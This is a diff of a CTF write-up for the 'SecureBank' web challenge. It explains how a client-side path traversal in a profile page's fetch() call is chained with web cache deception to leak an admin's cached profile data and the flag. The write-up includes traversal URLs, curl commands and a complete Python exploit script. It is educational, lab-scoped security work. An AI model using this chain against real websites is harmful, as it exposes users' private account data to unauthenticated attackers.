@@ -1,64 +1,81 @@
-# SecureBank Challenge Writeup: Cache Deception + CSPT Account Takeover
-
 ## Introduction
 
-While exploring the SecureBank online banking application, there is two seemingly unexploitable vulnerabilities. Individually, these issues had no real impact - but when chained together, you will be able to achieve complete account takeover of the bank administrator and retrieve the flag.
+I had the honor of being a challenge author for **Fetch The Flag CTF 2026**, organized by Snyk and HackingHub. I designed a single web challenge called **SecureBank**, and by the end of the competition it had been solved **34 times**.
 
-This writeup demonstrates how combining a Client-Side Path Traversal (CSPT) and a Cache Deception vulnerability can turn two gadgets into a critical security issue.
+> **Want to try it yourself?** You can run the challenge locally before reading further: [github.com/F0DH1L/snyk_ctf_2k26_chall](https://github.com/F0DH1L/snyk_ctf_2k26_chall)
 
-## Initial Reconnaissance
+![Challenge on the platform](image.png)
 
-After registering an account on the portal, I was redirected to my account dashboard. The application appeared to be a standard interface with account information.
+SecureBank is an online banking application that contains two seemingly harmless vulnerabilities. Neither one is exploitable in isolation, but chaining them together yields **complete account takeover** of the bank administrator. This article walks through the intended solution: combining a **Client-Side Path Traversal (CSPT)** with a **Web Cache Deception** flaw to leak the admin's sensitive profile data and the flag.
 
-While exploring the application, I noticed a "Report Suspicious Activity to Bank Security" button - suggesting that bank administrators actively review reported URLs, similar to XSS bot scenarios in many web applications.
+---
 
-## Finding #1: Cache Deception
+## Exploring the Application
 
-During my initial reconnaissance, I intercepted the authenticated API request that loads user profile data:
+After registering an account, players land on a standard banking dashboard. The interface shows account information and, importantly, a **"Report Suspicious Activity to Bank Security"** button, a clear hint that an admin bot actively visits reported URLs, much like an XSS-bot scenario.
+
+![Login page](image-1.png)
+![Main dashboard](image-2.png)
+
+---
+
+## Vulnerability 1, Web Cache Deception
+
+### Discovering the Cached Endpoint
+
+Intercepting the authenticated API request that loads user profile data reveals the following exchange:
 
 ```http
-GET /api/profile/a1b2c3d4 HTTP/1.1
-Host: localhost:1337
+GET /api/profile/549384146d072a64 HTTP/1.1
+Host: 0q930pc949s2.ctfhub.io
 X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 Accept: application/json
 Accept-Encoding: gzip, deflate, br
 
 HTTP/1.1 200 OK
+Server: nginx/1.28.0
+Date: Tue, 17 Feb 2026 20:01:28 GMT
 Content-Type: application/json
-Cache-Control: no-cache, no-store, must-revalidate
+Content-Length: 97
+Connection: keep-alive
 X-Cache-Status: MISS
 
-{"user_id":"a1b2c3d4","username":"attacker","email":"attacker@evil.com","flag":""}
+{
+  "email": "asdf@f.com",
+  "flag": "",
+  "user_id": "549384146d072a64",
+  "username": "asdf"
+}
 ```
 
-The endpoint returns sensitive user data. I noticed the `Cache-Control` header was properly set to prevent caching, and the `X-Cache-Status: MISS` indicated the response wasn't cached.
+![Cache MISS on normal request](image-3.png)
 
-However, I decided to test if the application was vulnerable to **Cache Deception** by adding a `.css` extension to the URL:
+The `X-Cache-Status: MISS` header tells us the response was **not** served from the cache. So far, nothing unusual.
 
+### Triggering the Cache
 
-Interesting! The response was identical, but now:
-- The `Cache-Control` header changed to `max-age=86400, public`
-- The response is being cached by the reverse proxy
+With the profile endpoint in sight, I started experimenting, testing common cache deception techniques against it. One of the usual tricks paid off: appending a static-file extension (`.css`) to the API URL changes the caching behavior:
 
+- `Cache-Control` flips to `max-age=86400, public`
+- On a second request, `X-Cache-Status` becomes **HIT**, the reverse proxy is now serving a cached copy of the JSON response.
 
-we can see `X-Cache-Status: HIT` - the cached response is being served
+![Cache HIT after appending .css](image-4.png)
 
-### The Problem
+This is a textbook **Web Cache Deception** issue: the reverse proxy decides to cache a response based purely on the URL extension, ignoring the actual `Content-Type`, backend cache directives, and authentication requirements.
 
-This confirmed a classic **Cache Deception vulnerability**: the CDN/reverse proxy caches responses based solely on URL patterns (files ending in `.css`, `.js`, etc.) without considering:
-- The actual content type
-- Backend cache control headers  
-- Authentication requirements
+### Why It's Not Exploitable Alone
 
-However, this vulnerability appeared **unexploitable on its own**. Why?
+At first glance, this looks devastating, but there is a catch. The API authenticates requests via a custom `X-Auth-Token` header. **Browsers do not attach custom headers to regular navigations.** If an attacker simply sends a victim a link to `/api/profile/victim_id.css`, the browser visits it without the token, the backend returns `401 Unauthorized`, and the CDN caches an error, useless.
 
-**Browsers cannot automatically send custom headers like `X-Auth-Token` when users click on a link.** If I sent a victim the URL `http://localhost:1337/api/profile/victim_id.css`, their browser would visit it without authentication, receive a 401 error, and nothing would be cached.
+To weaponize this, we need a way to **force the victim's browser to issue an authenticated request** to the cacheable endpoint.
 
-I needed a way to force the victim's browser to make an **authenticated request** to this cacheable endpoint.
+---
 
-## Finding #2: Client-Side Path Traversal (CSPT)
+## Vulnerability 2, Client-Side Path Traversal (CSPT)
 
-While reviewing the profile page source code (View Source → `profile.html`), I discovered vulnerable JavaScript code:
+### Inspecting the Frontend
+
+Reviewing the source of the profile page reveals how the client fetches user data:
 
 ```javascript
 async function loadUserProfile() {
@@ -90,83 +107,45 @@ async function loadUserProfile() {
 }
 ```
 
-This is a classic example of **Client-Side Path Traversal (CSPT)**:
-- The `userId` parameter from the URL is directly embedded into the API path
-- No validation or sanitization is performed
-- The request includes the user's authentication token from localStorage
+The `userId` query parameter is concatenated directly into the API URL with **zero validation**. Because the resulting string is passed to `fetch()`, which automatically normalizes directory-traversal sequences, an attacker can redirect the request to an arbitrary same-origin path.
 
-### Testing the CSPT
+### Proof of Concept
 
-I tested this by visiting:
+Visiting the following URL confirms the traversal:
+
 ```
 http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4
 ```
 
-The JavaScript would construct:
-```
-http://localhost:1337/api/users/info/../../api/profile/a1b2c3d4
-```
+The JavaScript constructs `/api/users/info/../../api/profile/a1b2c3d4`, which the browser normalizes to `/api/profile/a1b2c3d4`. The request goes out **with the victim's `X-Auth-Token` header attached**, and the API responds normally.
 
-Which the browser normalizes to:
-```
-http://localhost:1337/api/profile/a1b2c3d4
-```
+![CSPT working, authenticated request redirected](image-5.png)
 
-The request succeeded, and the API returned my profile data! I could control the path of an **authenticated API request**.
+On its own, this CSPT doesn't accomplish much, the attacker can only redirect the victim's request to other endpoints on the same origin. But combined with the cache deception finding, it becomes the missing piece of the puzzle.
 
+---
 
-## The Chain: Combining Both Vulnerabilities
+## Chaining the Bugs, Full Exploit
 
-Then it hit me: **What if I combined both findings?**
+### The Core Idea
 
-The CSPT vulnerability allows me to:
-- Control the path of an authenticated API request  
-- Include the `X-Auth-Token` header automatically
+| Vulnerability | What it provides |
+|---|---|
+| **CSPT** | Control over the path of an **authenticated** `fetch()` request |
+| **Cache Deception** | Any request to a URL ending in `.css` is cached **publicly** by the CDN |
 
-The Cache Deception vulnerability requires:
-- An authenticated request with `X-Auth-Token` header  
-- A URL ending in `.css` (or similar static extension)
+By injecting a traversal payload that ends in `.css`, the CSPT forces the victim's browser to make an **authenticated request to a cacheable URL**. The CDN then stores the response, making the victim's private data accessible to anyone.
 
-**What if I used the CSPT to make an authenticated request directly to the cacheable endpoint?**
+### Step by Step Exploitation
 
-### Crafting the Exploit
-
-I crafted a malicious URL combining path traversal with the cacheable `.css` extension:
-
-```
-http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4.css
-```
-
-When a victim visits this URL, the vulnerable JavaScript constructs:
-
-```
-http://localhost:1337/api/users/info/../../api/profile/a1b2c3d4.css
-```
-
-Which resolves to:
-
-```
-http://localhost:1337/api/profile/a1b2c3d4.css
-```
-
-**The key insight:** This request includes the **victim's `X-Auth-Token` header** (from their localStorage), so when the CSPT triggers, it sends an **authenticated request to the cacheable endpoint**.
-
-The API returns the victim's sensitive profile data, and the CDN caches the response at `/api/profile/a1b2c3d4.css`.
-
-Now, when anyone (including unauthenticated attackers) visits `http://localhost:1337/api/profile/a1b2c3d4.css`, the CDN serves the **victim's cached sensitive data**, including their flag (if they're an admin)!
-
-## Exploitation Steps
-
-### Step 1: Create an Attacker Account
+**1. Register an attacker account**
 
 ```bash
-# Register a new account
 curl -X POST http://localhost:1337/api/register \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker123","email":"attacker@evil.com","password":"password123"}'
 ```
 
-Response:
 ```json
 {
   "success": true,
@@ -175,7 +154,7 @@ Response:
 }
 ```
 
-### Step 2: Extract User ID from JWT
+**2. Decode the JWT to obtain the user ID**
 
 ```python
 import jwt
@@ -185,103 +164,122 @@ payload = jwt.decode(token, options={"verify_signature": False})
 print(payload["user_id"])  
 ```
 
-### Step 3: Craft the Malicious URL
+**3. Craft the malicious URL**
 
 ```
 http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4e5f6.css
 ```
 
-This URL will:
-1. Load the profile page
-2. The JavaScript extracts `userId=../../api/profile/a1b2c3d4e5f6.css`
-3. Constructs API call to `/api/users/info/../../api/profile/a1b2c3d4e5f6.css`
-4. Normalizes to `/api/profile/a1b2c3d4e5f6.css`
-5. Makes authenticated request with victim's token
-6. Response gets cached by CDN
+When the victim visits this link, the following chain fires:
 
-### Step 4: Social Engineering - Report to Admin
+1. The profile page loads and reads the `userId` query parameter.
+2. JavaScript constructs the API URL: `/api/users/info/../../api/profile/a1b2c3d4e5f6.css`
+3. The browser normalizes it to: `/api/profile/a1b2c3d4e5f6.css`
+4. `fetch()` sends the request **with the victim's auth token**.
+5. The backend returns the victim's profile JSON.
+6. The CDN sees a `.css` URL and **caches the response publicly**.
 
-The application has a "Report Suspicious Activity to Bank Security" feature. I logged into my attacker account, visited my malicious URL, and clicked the report button.
+**4. Report the URL to the admin**
 
-Behind the scenes, a bank administrator (simulated by a headless browser bot) visits the reported URL with their authenticated session. The CSPT triggers, making an authenticated request to:
+Using the in-app reporting feature, submit the crafted URL. The admin bot visits it with an authenticated session, triggering the CSPT → Cache Deception chain.
 
 ```
 GET /api/profile/a1b2c3d4e5f6.css
 X-Auth-Token: <ADMIN_TOKEN>
 ```
 
-The response contains the **admin's profile data** and gets cached!
+The admin's profile data is now cached.
 
-### Step 5: Access the Cached Data
-
-Now, as an unauthenticated attacker, I can simply visit:
+**5. Retrieve the cached data**
 
 ```bash
 curl http://localhost:1337/api/profile/a1b2c3d4e5f6.css
 ```
 
-Response (cached, no authentication needed):
 ```json
 {
   "user_id": "admin_id_xyz",
   "username": "Administrator",
   "email": "admin@securebank.com",
-  "flag": "flag{cache_deception_cspt_chain}"
+  "flag": "flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}"
 }
 ```
 
-**Account Takeover achieved!** The admin's flag is exposed.
+No authentication required, the CDN happily serves the cached admin data.
 
-## Automated Exploit Script
+---
 
-Here's the complete Python exploit:
+## Final Exploit
+
+The full exploit script automates every step: registration, login, URL reporting, and flag retrieval.
 
 ```python
 import requests
-import jwt
 import uuid
 
-base_url = "http://localhost:1337"
+base_url = "https://0q930pc949s2.ctfhub.io"
+auth_token = ""
 
-# Step 1: Register new attacker account
-username = "attacker_" + str(uuid.uuid4())[:8]
-email = f"{username}@evil.com"
+proxies = {
+    "http": "http://localhost:8080",
+    "https": "http://localhost:8080",
+}
+
+def register(username, email, password):
+    url = f"{base_url}/api/register"
+    data = {"username": username, "email": email, "password": password}
+    response = requests.post(url, json=data)
+    print(f"Registration response: {response.status_code}")
+    return response.json()
+
+def login(username, password):
+    url = f"{base_url}/api/login"
+    data = {"username": username, "password": password}
+    response = requests.post(url, json=data)
+    global auth_token
+    auth_token = response.json().get("auth_token", "")
+    print(f"Login response: {response.status_code}, Auth Token: {auth_token}")
+    return response.json()
+
+def get_profile(user_id):
+    url = f"{base_url}/api/profile/{user_id}"
+    response = requests.get(url, proxies=proxies, verify=False)
+    return response.json()
+
+def report_url(auth_token, url_to_report):
+    url = f"{base_url}/api/report"
+    headers = {"X-Auth-Token": auth_token}
+    data = {"url": url_to_report}
+    response = requests.post(url, json=data, headers=headers, proxies=proxies, verify=False)
+    print(f"Report URL response: {response.status_code}")
+    return response.json()
+
+# --- Exploit Flow ---
+username = "asdf1234" + str(uuid.uuid4())
+email = "email" + str(uuid.uuid4()) + "@gmail.com"
 password = "password123"
 
-register_data = {"username": username, "email": email, "password": password}
-response = requests.post(f"{base_url}/api/register", json=register_data)
-auth_token = response.json()["auth_token"]
-print(f"[+] Registered as: {username}")
+register(username, email, password)
+login(username, password)
 
-# Step 2: Extract user_id from JWT
-payload = jwt.decode(auth_token, options={"verify_signature": False})
-user_id = payload["user_id"]
-print(f"[+] User ID: {user_id}")
+malicious_url = f"{base_url}/profile?userId=../../../../../../api/profile/asdf_{username}.css"
+report_url(auth_token, malicious_url)
 
-# Step 3: Craft malicious URL with CSPT + Cache Deception
-malicious_url = f"{base_url}/profile?userId=../../api/profile/{user_id}.css"
-print(f"[+] Malicious URL: {malicious_url}")
-
-# Step 4: Report URL to trigger admin bot visit
-headers = {"X-Auth-Token": auth_token}
-report_data = {"url": malicious_url}
-response = requests.post(f"{base_url}/api/report", json=report_data, headers=headers)
-print(f"[+] Reported to admin: {response.json()['message']}")
-
-# Step 5: Access cached endpoint (no authentication needed!)
-import time
-time.sleep(3)  # Wait for admin bot to visit
-
-response = requests.get(f"{base_url}/api/profile/{user_id}.css")
-data = response.json()
-
-print(f"\n[+] Successfully accessed cached admin data!")
-print(f"[+] Admin Username: {data.get('username')}")
-print(f"[+] Admin Email: {data.get('email')}")
-print(f"[+] flag: {data.get('flag')}")
+result = get_profile(f"asdf_{username}.css")
+print(result)
 ```
 
-Output:
 ```
 {'email': 'admin@example.com', 'flag': 'flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}', 'user_id': '707f09fc9547f88b', 'username': 'Administrator'}
 ```
+
+![Exploit output, admin flag retrieved](image-6.png)
+
+---
+
+## Key Takeaways
+
+- **Neither vulnerability was critical on its own.** The cache deception needed an authenticated trigger; the CSPT had no direct impact. Together, they produced a full account takeover.
+- **CSPT is an underrated gadget.** It doesn't just redirect navigations, it can weaponize `fetch()` calls that carry auth tokens, turning innocent client-side code into an attacker-controlled HTTP client.
+
+Thanks to Snyk and HackingHub for hosting the CTF, I hope players enjoyed the challenge!
